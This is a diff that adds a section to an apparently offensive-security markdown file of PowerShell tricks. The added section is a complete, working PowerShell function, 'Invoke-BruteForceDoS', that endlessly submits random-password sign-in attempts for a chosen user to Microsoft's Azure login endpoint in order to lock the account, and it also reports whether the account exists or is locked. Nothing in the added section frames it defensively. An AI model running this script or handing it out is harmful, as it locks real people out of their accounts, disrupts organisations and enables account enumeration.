@@ -1,5 +1,63 @@
 # PowerShell Tricks:
 
+## PowerShell Azure DoS:
+
+```powershell
+function Invoke-BruteForceDoS
+{
+    Param(
+            [Parameter(Mandatory=$True)]
+            [string]$User
+        )
+    while($true)
+    {
+        $randomGuid = New-Guid
+        $body = @{
+            "resource"   = $randomGuid
+            "client_id"  = $randomGuid
+            "grant_type" ="password"
+            "username"   = $User
+            "password"   = $randomGuid
+            "scope"      = "openid"
+        }
+
+        try
+        {
+            $response=Invoke-RestMethod -UseBasicParsing -Uri "https://login.microsoftonline.com/common/oauth2/token" -ContentType "application/x-www-form-urlencoded" -Method POST -Body $body
+        }
+        catch
+        {
+            $stream = $_.Exception.Response.GetResponseStream()
+            $responseBytes = New-Object byte[] $stream.Length
+
+            $stream.Position = 0
+            $stream.Read($responseBytes,0,$stream.Length) | Out-Null
+            
+            $errorDetails = [text.encoding]::UTF8.GetString($responseBytes) | ConvertFrom-Json | Select -ExpandProperty error_description
+
+            $datacenter = "{0,-6}" -f ($_.Exception.Response.Headers["x-ms-ests-server"].Split(" ")[2])
+        }
+            
+        # Parse the error code.
+        if(!$exists -and $errorDetails)
+        {
+            if($errorDetails.startsWith("AADSTS50053")) # The account is locked, you've tried to sign in too many times with an incorrect user ID or password.
+            {
+                Write-Host "$($datacenter): [ LOCKED ] $user" -ForegroundColor Red
+            }
+            elseif($errorDetails.StartsWith("AADSTS50126")) # Error validating credentials due to invalid username or password.
+            {
+                Write-Host "$($datacenter): [WRONGPWD] $user" -ForegroundColor Gray
+            }
+            elseif($errorDetails.StartsWith("AADSTS50034")) # The user account {identifier} does not exist in the {tenant} directory. To sign into this application, the account must be added to the directory.
+            {
+                Write-Host "$($datacenter): [NOTFOUND] $user" 
+            }
+        }
+    }
+}
+```
+
 ## PowerShell Port Scanning:
 
 Powershell Test-NetConnection, ```tnc``` for short, host and port scanning:
